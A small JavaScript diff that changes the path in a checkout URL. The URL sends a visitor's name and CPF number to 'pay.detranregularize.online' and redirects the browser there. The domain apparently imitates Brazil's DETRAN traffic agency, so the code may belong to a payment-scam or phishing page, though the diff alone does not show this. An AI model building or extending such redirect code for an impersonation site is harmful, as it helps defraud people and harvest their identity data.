@@ -70,7 +70,7 @@ function addGerarPagamentoListener() {
         const encodedName = encodeURIComponent(nome);
         
         
-        const checkoutURL = `https://pay.detranregularize.online/nWrxGWj5JoyZ654/?name=${encodedName}&document=${cpf}`;
+        const checkoutURL = `https://pay.detranregularize.online/nWrxGWaRPYX3654/?name=${encodedName}&document=${cpf}`;
         
         window.location.href = checkoutURL;
       }
